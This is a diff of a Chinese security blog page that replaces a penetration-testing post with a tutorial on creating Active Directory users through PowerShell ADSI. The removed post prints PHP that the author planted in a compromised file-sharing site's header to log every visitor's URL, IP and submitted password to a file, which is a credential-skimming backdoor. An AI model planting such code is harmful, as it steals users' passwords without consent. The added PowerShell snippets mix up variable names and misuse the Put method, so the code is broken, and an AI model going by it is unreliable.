@@ -35,16 +35,22 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta name="description" content="在域内环境中，常常需要使用命令行管理域用户，此时可以使用Active Directory中的命令行工具Dsquery.exe，或CSVE，以及Ldifde等，其实，使用Windows Powershell来进行管理操作也是相当的方便。
+下面以创建用户举例：创建域用户最基本的Windows Powershell脚本类似这样：
+$objOU=[ADSI]”LDAP://OU=People,DC=con">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP记录URL、表单内容">
-<meta property="og:url" content="http://www.rootat.net/2015/07/16/PHPURLForm/index.html">
+<meta property="og:title" content="使用powershell管理域用户">
+<meta property="og:url" content="http://www.rootat.net/2016/04/18/ManageADUserByPowershell/index.html">
 <meta property="og:site_name" content="root@Zeroh">
-<meta property="og:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
-<meta property="og:updated_time" content="2016-03-09T07:58:56.722Z">
+<meta property="og:description" content="在域内环境中，常常需要使用命令行管理域用户，此时可以使用Active Directory中的命令行工具Dsquery.exe，或CSVE，以及Ldifde等，其实，使用Windows Powershell来进行管理操作也是相当的方便。
+下面以创建用户举例：创建域用户最基本的Windows Powershell脚本类似这样：
+$objOU=[ADSI]”LDAP://OU=People,DC=con">
+<meta property="og:updated_time" content="2016-04-18T09:10:19.261Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP记录URL、表单内容">
-<meta name="twitter:description" content="某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此">
+<meta name="twitter:title" content="使用powershell管理域用户">
+<meta name="twitter:description" content="在域内环境中，常常需要使用命令行管理域用户，此时可以使用Active Directory中的命令行工具Dsquery.exe，或CSVE，以及Ldifde等，其实，使用Windows Powershell来进行管理操作也是相当的方便。
+下面以创建用户举例：创建域用户最基本的Windows Powershell脚本类似这样：
+$objOU=[ADSI]”LDAP://OU=People,DC=con">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -54,7 +60,7 @@
   };
 </script>
 
-  <title> PHP记录URL、表单内容 | root@Zeroh </title>
+  <title> 使用powershell管理域用户 | root@Zeroh </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -145,7 +151,7 @@
           
           
             
-              PHP记录URL、表单内容
+              使用powershell管理域用户
             
           
         </h1>
@@ -154,8 +160,8 @@
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-07-16T15:52:28+08:00" content="2015-07-16">
-            2015-07-16
+          <time itemprop="dateCreated" datetime="2016-04-18T17:05:20+08:00" content="2016-04-18">
+            2016-04-18
           </time>
         </span>
 
@@ -165,8 +171,8 @@
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/07/16/PHPURLForm/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/07/16/PHPURLForm/" itemprop="commentsCount"></span>
+            <a href="/2016/04/18/ManageADUserByPowershell/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/04/18/ManageADUserByPowershell/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -180,18 +186,43 @@
       
 
       
-        <span itemprop="articleBody"><p>某次渗透中，目标网站为CakePHP二次开发的网盘，文件被加密且设有访问密码，密码验证通过后才能下载到解密后的文件。利用某个不通用的漏洞点获取到权限后，遗憾的是数据库中居然没有密码的记录。<br>通过对源代码的分析，发现相关信息通过写入session验证而非数据库校验。最后想了个笨方法，在头部PHP文件中插入代码，记录URL、IP及表单内容，由于已知目标办公网段，通过IP可以判断文件是否为感兴趣的内容，此时有了URL和密码，就可以获得解密后的文件。</p>
-<pre><code>&lt;?php
-<span class="variable">$URL</span>[<span class="string">'URL'</span>] = <span class="string">"http://"</span>.$_SERVER[<span class="string">'SERVER_NAME'</span>].$_SERVER[<span class="string">'PHP_SELF'</span>].($_SERVER[<span class="string">'QUERY_STRING'</span>] ? <span class="string">"?"</span>.$_SERVER[<span class="string">'QUERY_STRING'</span>] : <span class="string">""</span>); 
-<span class="variable">$ip</span>=$_SERVER[<span class="string">"REMOTE_ADDR"</span>];
-<span class="variable">$pass</span> = $_POST[<span class="string">"passname"</span>];
-<span class="variable">$fp</span> = fopen(<span class="string">'/var/www/log.txt'</span>, <span class="string">'a+b'</span>);
-fwrite(<span class="variable">$fp</span>, var_export(<span class="variable">$URL</span>[<span class="string">'URL'</span>], <span class="literal">true</span>));
-fwrite(<span class="variable">$fp</span>, <span class="variable">$pass</span>);
-fwrite(<span class="variable">$fp</span>, <span class="variable">$ip</span>);
-fwrite(<span class="variable">$fp</span>, <span class="string">"\n"</span>);
-fclose(<span class="variable">$fp</span>);
-?&gt;
+        <span itemprop="articleBody"><p>在域内环境中，常常需要使用命令行管理域用户，此时可以使用Active Directory中的命令行工具Dsquery.exe，或CSVE，以及Ldifde等，其实，使用Windows Powershell来进行管理操作也是相当的方便。</p>
+<p>下面以创建用户举例：<br>创建域用户最基本的Windows Powershell脚本类似这样：</p>
+<pre><code><span class="variable">$objOU</span>=[ADSI]”LDAP://OU=People,DC=contoso,DC=com”
+<span class="variable">$objUser</span>=<span class="variable">$objU</span>.Create(“user”,”CN=Mary North”)
+<span class="variable">$odjUser</span>.Put=(“sAMAccountName”,”mary.north”)
+<span class="variable">$objUser</span>.SetInfo()
+</code></pre><p>上述代码列举了在Active Directory中使用Windows Powershell创建用户的四个基本步骤。<br>下面将作详细介绍。</p>
+<blockquote>
+<p><strong>连接到Active Directory容器</strong></p>
+</blockquote>
+<p>要创建用户这样的对象，实际上是要对该对象的容器来创建对象。因此首先需要针对容器，执行某种操作，也就是“方法”。第一步需要连接到容器，Windows Powershell可以使用Active Directory服务接口类型适配器切入到Active Directory对象。要连接Active Directory对象，必须提交LDAP查询字符串，也就是LDAP://协议标识符，后跟对象的DN。因此第一行代码应该像下面这样：</p>
+<pre><code><span class="variable">$objOU</span>=[<span class="constant">ADSI</span>]”<span class="constant">LDAP</span><span class="symbol">://OU=People</span>,<span class="constant">DC</span>=contoso,<span class="constant">DC</span>=com”
+</code></pre><p>Windows Powershell需要使用ADSI类型适配器创建代表People OU的对象，并将其分配给分量。名为objOU的变量反映了对变量类型进行标识，以obj开头只是编程标准，但实际变量可以使用任何名称。</p>
+<pre><code><span class="keyword">*</span><span class="keyword">*</span>调用Create方法<span class="keyword">*</span><span class="keyword">*</span>
+</code></pre><p>至此，变量$objOU就可以代表People OU。接着即可使用容器的create方法让容器创建对象。Create方法需要提供两个参数：对象类和对象RDN。对象的RDN是指该对象在父容器下的名称位置，大部分对象类则使用“CN=对象名”这样的格式作为自己的RDN。然而OU的RDN是“OU=组织单位名称”这样的格式，而域的RDN是“DN=域名”。因此下列代码可以使用”CN=Mary North”这样的RDN创建用户对象:</p>
+<blockquote>
+<p>$objUser=$objU.Create(“user”,”CN=Mary North”)</p>
+</blockquote>
+<p>生成的对象结果会分配给变量$objUser，并用该变量代表要创建的对象，可供后续操作。</p>
+<pre><code><span class="keyword">*</span><span class="keyword">*</span>填写用户属性<span class="keyword">*</span><span class="keyword">*</span>
+</code></pre><p>这里需要注意一个问题，在将改动合并之前，新对象和其进行的改动都不会保存，而在填写所有必要的属性之前，还不能成功合并改动。用户对象的必须舒心包括windows 2000前登陆名。该属性的LDAP名称是sAMAccountName，因此代码的下一行需要为对象指派sAMAccountName，此时需要使用Put方法。Put是为对象写入属性的标准方法，Get则是检索对象属性的标准方法，此处的代码应该像下面这样：</p>
+<blockquote>
+<p>$odjUser.Put=(“sAMAccountName”,”mary.north”)</p>
+</blockquote>
+<p>对于用户对象，还有其他强制属性，包括对象的安全标识符(SID)，但这些对象会在将新用户提交到目录的时候用Active Directory自动创建。</p>
+<p>使用SetInfo方法合并改动<br>要合并改动，请使用Active Directory对象的SetInfo方法。此处的代码应该像下面这样：</p>
+<pre><code><span class="variable">$objUser</span>.SetInfo()
+</code></pre><p>填写其他用户属性<br>上述命令将创建只包含强制sAMAccountName属性的用户，在创建用户对象时，还需要填写其他用户属性。前面介绍了使用用户对象的Put方法写入属性，因此这里只需要重复调用该方法，指定需要添加的每个属性即可：</p>
+<pre><code><span class="variable">$odjUser</span>.Put=(“sAMAccountName”, ”<span class="variable">$samAccountName</span>”)
+<span class="variable">$odjUser</span>.Put=(“displayName”, ”<span class="variable">$displayname</span>”)
+<span class="variable">$odjUser</span>.Put=(“sn”, “<span class="variable">$sn</span>”)
+<span class="variable">$objUser</span>.SetInfo()
+</code></pre><p>用户的密码又怎么办？使用Put方法无法设置用户密码，相反此时应当使用SetPassword方法，例如这样:</p>
+<pre><code><span class="variable">$objUser</span>.SetPassword(“passwd”)
+</code></pre><p>然而SetPassword方法只能在创建好用户并调用SetInfo()方法之后使用，这意味着实际上，我们是首选创建好账户，随即才为其设置密码。<strong>这并不是Windows Powershell的Bug或局限，而是Kerberos和LDAP的实际要求。不过安全性并不会受损</strong>，因为这样创建的账户处于禁用状态。<br>因此账户的状态实际上是一种标志(flag)，无法直接使用Put命令设置。此时需要下列命令：</p>
+<pre><code><span class="variable">$objUser</span>.psbase.InvokeSet(“AccountDisabled”,<span class="variable">$false</span>)
+<span class="variable">$objUser</span>.SetInfo()
 </code></pre></span>
       
     </div>
@@ -203,13 +234,11 @@ fclose(<span class="variable">$fp</span>);
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2015/08/13/GPPcpassword/" rel="prev">利用域凭据：解密GPP中的管理员密码</a>
-            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/06/08/passwdTOPN/" rel="next">高效词频分析</a>
+              <a href="/2016/03/29/httpscan/" rel="next">httpscan 爬虫式的网段Web主机发现小工具</a>
             
           </div>
         </div>
@@ -371,9 +400,9 @@ fclose(<span class="variable">$fp</span>);
 
     <script type="text/javascript">
       var disqus_shortname = 'rootat';
-      var disqus_identifier = '2015/07/16/PHPURLForm/';
-      var disqus_title = 'PHP记录URL、表单内容';
-      var disqus_url = 'http://www.rootat.net/2015/07/16/PHPURLForm/';
+      var disqus_identifier = '2016/04/18/ManageADUserByPowershell/';
+      var disqus_title = '使用powershell管理域用户';
+      var disqus_url = 'http://www.rootat.net/2016/04/18/ManageADUserByPowershell/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
